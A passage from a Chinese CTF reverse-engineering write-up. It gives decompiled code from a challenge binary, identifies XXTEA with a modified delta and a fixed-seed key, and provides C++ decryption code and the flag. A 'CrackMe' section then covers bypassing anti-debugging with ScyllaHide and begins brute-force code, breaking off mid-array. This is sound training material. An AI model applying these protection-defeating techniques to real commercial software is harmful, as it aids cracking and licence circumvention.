<pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> __fastcall <span class="token function">main_0</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  __int64 v3<span class="token punctuation">;</span> <span class="token comment">// rbp</span>
  __int64 v4<span class="token punctuation">;</span> <span class="token comment">// rdi</span>
  __int64 i<span class="token punctuation">;</span> <span class="token comment">// rcx</span>
  _DWORD <span class="token operator">*</span>v7<span class="token punctuation">;</span> <span class="token comment">// rdi</span>
  HANDLE CurrentProcess<span class="token punctuation">;</span> <span class="token comment">// rax</span>
  __int64 v9<span class="token punctuation">;</span> <span class="token comment">// [rsp-20h] [rbp-458h] BYREF</span>
  _DWORD v10<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-438h] BYREF</span>
  _BYTE v11<span class="token punctuation">[</span><span class="token number">64</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+8h] [rbp-430h] BYREF</span>
  _BYTE <span class="token operator">*</span>v12<span class="token punctuation">;</span> <span class="token comment">// [rsp+48h] [rbp-3F0h]</span>
  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v13<span class="token punctuation">;</span> <span class="token comment">// [rsp+64h] [rbp-3D4h]</span>
  <span class="token keyword">int</span> v14<span class="token punctuation">;</span> <span class="token comment">// [rsp+84h] [rbp-3B4h]</span>
  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v15<span class="token punctuation">;</span> <span class="token comment">// [rsp+A4h] [rbp-394h]</span>
  <span class="token keyword">int</span> v16<span class="token punctuation">;</span> <span class="token comment">// [rsp+C4h] [rbp-374h]</span>
  <span class="token keyword">int</span> v17<span class="token punctuation">;</span> <span class="token comment">// [rsp+E4h] [rbp-354h]</span>
  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> k<span class="token punctuation">;</span> <span class="token comment">// [rsp+104h] [rbp-334h]</span>
  <span class="token keyword">int</span> v19<span class="token punctuation">;</span> <span class="token comment">// [rsp+124h] [rbp-314h]</span>
  <span class="token keyword">int</span> v20<span class="token punctuation">;</span> <span class="token comment">// [rsp+144h] [rbp-2F4h]</span>
  <span class="token keyword">int</span> v21<span class="token punctuation">;</span> <span class="token comment">// [rsp+164h] [rbp-2D4h]</span>
  _DWORD v22<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+188h] [rbp-2B0h] BYREF</span>
  <span class="token keyword">unsigned</span> __int16 v23<span class="token punctuation">;</span> <span class="token comment">// [rsp+1B4h] [rbp-284h]</span>
  BOOL v24<span class="token punctuation">;</span> <span class="token comment">// [rsp+1D4h] [rbp-264h] BYREF</span>
  <span class="token keyword">unsigned</span> __int64 j<span class="token punctuation">;</span> <span class="token comment">// [rsp+1F8h] [rbp-240h]</span>
  <span class="token keyword">unsigned</span> __int64 v26<span class="token punctuation">;</span> <span class="token comment">// [rsp+218h] [rbp-220h]</span>
  _DWORD v27<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+238h] [rbp-200h]</span>
  <span class="token keyword">unsigned</span> __int64 m<span class="token punctuation">;</span> <span class="token comment">// [rsp+268h] [rbp-1D0h]</span>
  <span class="token keyword">int</span> v29<span class="token punctuation">;</span> <span class="token comment">// [rsp+3F4h] [rbp-44h]</span>
  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v30<span class="token punctuation">;</span> <span class="token comment">// [rsp+3F8h] [rbp-40h]</span>
  <span class="token keyword">int</span> v31<span class="token punctuation">;</span> <span class="token comment">// [rsp+3FCh] [rbp-3Ch]</span>
  __int64 v32<span class="token punctuation">;</span> <span class="token comment">// [rsp+400h] [rbp-38h]</span>
  <span class="token keyword">int</span> v33<span class="token punctuation">;</span> <span class="token comment">// [rsp+408h] [rbp-30h]</span>
  <span class="token keyword">unsigned</span> __int64 v34<span class="token punctuation">;</span> <span class="token comment">// [rsp+410h] [rbp-28h]</span>
  __int64 v35<span class="token punctuation">;</span> <span class="token comment">// [rsp+428h] [rbp-10h]</span>
  __int64 v36<span class="token punctuation">;</span> <span class="token comment">// [rsp+430h] [rbp-8h]</span>

  v36 <span class="token operator">=</span> v3<span class="token punctuation">;</span>
  v35 <span class="token operator">=</span> v4<span class="token punctuation">;</span>
  v7 <span class="token operator">=</span> v10<span class="token punctuation">;</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">170</span><span class="token punctuation">;</span> i<span class="token punctuation">;</span> <span class="token operator">--</span>i <span class="token punctuation">)</span>
    <span class="token operator">*</span>v7<span class="token operator">++</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">858993460</span><span class="token punctuation">;</span>
  v34 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int64<span class="token punctuation">)</span>v10 <span class="token operator">^</span> <span class="token number">0x1401D9000LL</span><span class="token punctuation">;</span>
  <span class="token function">j___CheckForDebuggerJustMyCode</span><span class="token punctuation">(</span><span class="token number">0x1401ED104LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">memset</span><span class="token punctuation">(</span>v11<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x20u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">sub_140087C02</span><span class="token punctuation">(</span><span class="token number">0x1401A1190LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">IsDebuggerPresent</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token function">sub_1400868E3</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    v12 <span class="token operator">=</span> v11<span class="token punctuation">;</span>
    <span class="token function">memset</span><span class="token punctuation">(</span>v22<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x10u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    v23 <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span>
    v29 <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span>
    v20 <span class="token operator">=</span> <span class="token number">12</span><span class="token punctuation">;</span>
    v15 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    v16 <span class="token operator">=</span> <span class="token number">0x61C88646</span><span class="token punctuation">;</span>
    v21 <span class="token operator">=</span> <span class="token number">0x95664B48</span><span class="token punctuation">;</span>
    v19 <span class="token operator">=</span> <span class="token number">7</span><span class="token punctuation">;</span>
    v24 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    CurrentProcess <span class="token operator">=</span> <span class="token function">GetCurrentProcess</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">CheckRemoteDebuggerPresent</span><span class="token punctuation">(</span>CurrentProcess<span class="token punctuation">,</span> <span class="token operator">&amp;</span>v24<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>v24 <span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
      <span class="token function">j_srand</span><span class="token punctuation">(</span><span class="token number">0xAABBu</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">for</span> <span class="token punctuation">(</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> <span class="token number">4</span><span class="token punctuation">;</span> <span class="token operator">++</span>j <span class="token punctuation">)</span>
        v22<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">j_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>
      <span class="token punctuation">&#123;</span>
        v29 <span class="token operator">=</span> v19<span class="token operator">--</span><span class="token punctuation">;</span>
        v30 <span class="token operator">=</span> v29 <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>v30 <span class="token punctuation">)</span>
          <span class="token keyword">break</span><span class="token punctuation">;</span>
        v15 <span class="token operator">+=</span> v16<span class="token punctuation">;</span>
        v17 <span class="token operator">=</span> <span class="token punctuation">(</span>v15 <span class="token operator">>></span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span> k <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> k <span class="token operator">&lt;</span> v23<span class="token punctuation">;</span> <span class="token operator">++</span>k <span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
          v26 <span class="token operator">=</span> <span class="token function">__rdtsc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          v13 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span><span class="token number">4</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>k <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> v23<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
          v29 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">4</span> <span class="token operator">*</span> v13<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span><span class="token number">4</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>k <span class="token operator">+</span> v23 <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> v23<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">>></span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          v30 <span class="token operator">=</span> k <span class="token operator">+</span> v23 <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>
          v31 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">16</span> <span class="token operator">*</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span><span class="token number">4</span> <span class="token operator">*</span> <span class="token punctuation">(</span>v30 <span class="token operator">%</span> v23<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>v13 <span class="token operator">>></span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> v29<span class="token punctuation">;</span>
          v32 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8<span class="token punctuation">)</span>v17 <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8<span class="token punctuation">)</span>k<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">;</span>
          v33 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span><span class="token number">4</span> <span class="token operator">*</span> <span class="token punctuation">(</span>v30 <span class="token operator">%</span> v23<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">^</span> v22<span class="token punctuation">[</span>v32<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>v13 <span class="token operator">^</span> v15<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">^</span> v31<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span><span class="token number">4</span> <span class="token operator">*</span> k<span class="token punctuation">]</span><span class="token punctuation">;</span>
          <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span><span class="token number">4</span> <span class="token operator">*</span> k<span class="token punctuation">]</span> <span class="token operator">=</span> v33<span class="token punctuation">;</span>
          v14 <span class="token operator">=</span> v33<span class="token punctuation">;</span>
          <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">__rdtsc</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> v26 <span class="token operator">></span> <span class="token number">0x83C0</span> <span class="token punctuation">)</span>
            <span class="token keyword">goto</span> LABEL_20<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
      <span class="token punctuation">&#125;</span>
      v27<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xA9934E2F</span><span class="token punctuation">;</span>
      v27<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x30B90FA</span><span class="token punctuation">;</span>
      v27<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xDCBF1D3</span><span class="token punctuation">;</span>
      v27<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x328B5BDE</span><span class="token punctuation">;</span>
      <span class="token keyword">for</span> <span class="token punctuation">(</span> m <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> m <span class="token operator">&lt;</span> <span class="token number">4</span><span class="token punctuation">;</span> <span class="token operator">++</span>m <span class="token punctuation">)</span>
      <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span> v27<span class="token punctuation">[</span>m<span class="token punctuation">]</span> <span class="token operator">!=</span> v10<span class="token punctuation">[</span>m <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span> <span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
          <span class="token function">sub_140087C02</span><span class="token punctuation">(</span><span class="token number">0x1401A11A8LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token function">j_system</span><span class="token punctuation">(</span>byte_1401A11A0<span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token keyword">goto</span> LABEL_20<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
      <span class="token punctuation">&#125;</span>
      <span class="token function">sub_140087C02</span><span class="token punctuation">(</span><span class="token number">0x1401A11C0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token function">j_system</span><span class="token punctuation">(</span>byte_1401A11A0<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span>
LABEL_20<span class="token operator">:</span>
  <span class="token function">j__RTC_CheckStackVars</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v9<span class="token punctuation">,</span> <span class="token punctuation">(</span>_RTC_framedesc <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>unk_1401A1140<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">j___security_check_cookie</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int64<span class="token punctuation">)</span>v10 <span class="token operator">^</span> v34<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token function">sub_1401F8E9B</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>很清晰看出来是XXTEA加密，密钥是固定种子随机数随机得到的，Delta被魔改，然后密文也能看到。</p>
<p><strong>注：写WP时用的是旧版附件分析，缺失了后面16字节密文</strong></p>
<p>完整密文数据：</p>
<pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token number">0xa9934e2f</span><span class="token punctuation">,</span> <span class="token number">0x30b90fa</span><span class="token punctuation">,</span> <span class="token number">0xdcbf1d3</span><span class="token punctuation">,</span> <span class="token number">0x328b5bde</span><span class="token punctuation">,</span>
<span class="token number">0x44fab4e</span><span class="token punctuation">,</span> <span class="token number">0x1dcf0051</span><span class="token punctuation">,</span> <span class="token number">0x85ebbe55</span><span class="token punctuation">,</span> <span class="token number">0x93aa773a</span></code></pre>

<p>解密代码：</p>
<pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">DELTA</span> <span class="token expression"><span class="token number">0x61C88646</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">MX</span> <span class="token expression"><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>z <span class="token operator">>></span> <span class="token number">5</span> <span class="token operator">^</span> y <span class="token operator">&lt;&lt;</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>y <span class="token operator">>></span> <span class="token number">3</span> <span class="token operator">^</span> z <span class="token operator">&lt;&lt;</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>sum <span class="token operator">^</span> y<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>key<span class="token punctuation">[</span><span class="token punctuation">(</span>p <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">^</span> e<span class="token punctuation">]</span> <span class="token operator">^</span> z<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></span></span>

<span class="token keyword">void</span> <span class="token function">xxtea</span><span class="token punctuation">(</span><span class="token keyword">uint32_t</span> <span class="token operator">*</span>v<span class="token punctuation">,</span> <span class="token keyword">int</span> n<span class="token punctuation">,</span> <span class="token keyword">uint32_t</span> <span class="token keyword">const</span> key<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">uint32_t</span> y<span class="token punctuation">,</span> z<span class="token punctuation">,</span> sum<span class="token punctuation">;</span>
    <span class="token keyword">unsigned</span> p<span class="token punctuation">,</span> rounds<span class="token punctuation">,</span> e<span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>n <span class="token operator">></span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment">/* Coding Part */</span>
    <span class="token punctuation">&#123;</span>
        rounds <span class="token operator">=</span> <span class="token number">7</span><span class="token punctuation">;</span>
        sum <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
        z <span class="token operator">=</span> v<span class="token punctuation">[</span>n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">do</span>
        <span class="token punctuation">&#123;</span>
            sum <span class="token operator">+=</span> DELTA<span class="token punctuation">;</span>
            e <span class="token operator">=</span> <span class="token punctuation">(</span>sum <span class="token operator">>></span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">;</span>
            <span class="token keyword">for</span> <span class="token punctuation">(</span>p <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> p <span class="token operator">&lt;</span> n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> p<span class="token operator">++</span><span class="token punctuation">)</span>
            <span class="token punctuation">&#123;</span>
                y <span class="token operator">=</span> v<span class="token punctuation">[</span>p <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
                z <span class="token operator">=</span> v<span class="token punctuation">[</span>p<span class="token punctuation">]</span> <span class="token operator">+=</span> MX<span class="token punctuation">;</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span>z <span class="token operator">==</span> <span class="token number">0xA4F41487</span><span class="token punctuation">)</span>
                    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"11\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span>y <span class="token operator">==</span> <span class="token number">0xA4F41487</span><span class="token punctuation">)</span>
                    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"11\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
            y <span class="token operator">=</span> v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
            z <span class="token operator">=</span> v<span class="token punctuation">[</span>n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+=</span> MX<span class="token punctuation">;</span>

        <span class="token punctuation">&#125;</span> <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">--</span>rounds<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>n <span class="token operator">&lt;</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment">/* Decoding Part */</span>
    <span class="token punctuation">&#123;</span>
        n <span class="token operator">=</span> <span class="token operator">-</span>n<span class="token punctuation">;</span>
        rounds <span class="token operator">=</span> <span class="token number">7</span><span class="token punctuation">;</span>
        sum <span class="token operator">=</span> rounds <span class="token operator">*</span> DELTA<span class="token punctuation">;</span>
        y <span class="token operator">=</span> v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">do</span>
        <span class="token punctuation">&#123;</span>
            e <span class="token operator">=</span> <span class="token punctuation">(</span>sum <span class="token operator">>></span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">;</span>
            <span class="token keyword">for</span> <span class="token punctuation">(</span>p <span class="token operator">=</span> n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> p <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">;</span> p<span class="token operator">--</span><span class="token punctuation">)</span>
            <span class="token punctuation">&#123;</span>
                z <span class="token operator">=</span> v<span class="token punctuation">[</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
                y <span class="token operator">=</span> v<span class="token punctuation">[</span>p<span class="token punctuation">]</span> <span class="token operator">-=</span> MX<span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
            z <span class="token operator">=</span> v<span class="token punctuation">[</span>n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
            y <span class="token operator">=</span> v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">-=</span> MX<span class="token punctuation">;</span>
            sum <span class="token operator">-=</span> DELTA<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">--</span>rounds<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token function">srand</span><span class="token punctuation">(</span><span class="token number">0xAABB</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">uint32_t</span> key<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
    <span class="token keyword">uint32_t</span> Enc<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>
        <span class="token number">0xa9934e2f</span><span class="token punctuation">,</span> <span class="token number">0x30b90fa</span><span class="token punctuation">,</span> <span class="token number">0xdcbf1d3</span><span class="token punctuation">,</span> <span class="token number">0x328b5bde</span><span class="token punctuation">,</span>
        <span class="token number">0x44fab4e</span><span class="token punctuation">,</span> <span class="token number">0x1dcf0051</span><span class="token punctuation">,</span> <span class="token number">0x85ebbe55</span><span class="token punctuation">,</span> <span class="token number">0x93aa773a</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">4</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        key<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token function">xxtea</span><span class="token punctuation">(</span>Enc<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%.32s\n"</span><span class="token punctuation">,</span> Enc<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>flag{th15_15_51mpLe_obf_R19Ht?}</p>
<h3 id="CrackMe"><a href="#CrackMe" class="headerlink" title="CrackMe"></a>CrackMe</h3><p>有反调试，在WinMain开头断点，使用ScyllaHide一把梭去除（（。</p>
<p><img src="/images/47-1744626745338-52.png" loading="lazy"></p>
<p><img src="/images/48-1744626745338-53.png" loading="lazy"></p>
<p>从WinMain可以跟踪到窗口消息函数，图四就是验证函数按钮消息。</p>
<p><img src="/images/49-1744626745338-54.png" loading="lazy"></p>
<p><img src="/images/50-1744626745338-55.png" loading="lazy"></p>
<p><img src="/images/51-1744626745338-56.png" loading="lazy"></p>
<p><img src="/images/52-1744626745338-57.png" loading="lazy"></p>
<p>从TLS那边可以看到启动了一个线程，线程函数如下</p>
<p><img src="/images/53-1744626745339-58.png" loading="lazy"></p>
<p>这边死循环判断了一个值，然后调用CallBack，随便输入flag，点击验证，发现会先调用CallBack中的mark2函数进行第一次验证。</p>
<p><img src="/images/54-1744626745339-59.png" loading="lazy"></p>
<p>将这边v4都异或上0xBB会得到”flag{“五个字符，就明白这边是检测输入flag开头是否为”flag{“，进行了第一次验证，然后继续下一次验证进入了case 5的mark3函数。</p>
<p><img src="/images/55-1744626745339-60.png" loading="lazy"></p>
<p>mark3这边是用固定值生成了一个v5数值列表，a1是输入的字符串，但是可以看到+5跳过了前面的五个字符，然后对括号内的前7个字符做一些加密计算然后和v5列表前7个数值进行检验。</p>
<p>这边就可以直接提取v5生成的数值列表，然后利用爆破得到括号内的前七个字符。</p>
<p><img src="/images/56-1744626745339-61.png" loading="lazy"></p>
<p>爆破代码：</p>
<pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">unsigned</span> <span class="token keyword">int</span> box1<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
      <span class="token number">0x00000000</span><span class="token punctuation">,</span> <span class="token number">0xC0BA6CAC</span><span class="token punctuation">,</span> <span class="token number">0x5A05DF1B</span><span class="token punctuation">,</span> <span class="token number">0x9ABFB3B7</span><span class="token punctuation">,</span> <span class="token number">0xB40BBE36</span><span class="token punctuation">,</span> <span class="token number">0x74B1D29A</span><span class="token punctuation">,</span>
      <span class="token number">0xEE0E612D</span><span class="token punctuation">,</span> <span class="token number">0x2EB40D81</span><span class="token punctuation">,</span> <span class="token number">0xB3667A2F</span><span class="token punctuation">,</span> <span class="token number">0x73DC1683</span><span class="token punctuation">,</span> <span class="token number">0xE963A534</span><span class="token punctuation">,</span> <span class="token number">0x29D9C998</span><span class="token punctuation">,</span> <span class="token number">0x076DC419</span><span class="token punctuation">,</span> <span class="token number">0xC7D7A8B5</span><span class="token punctuation">,</span>
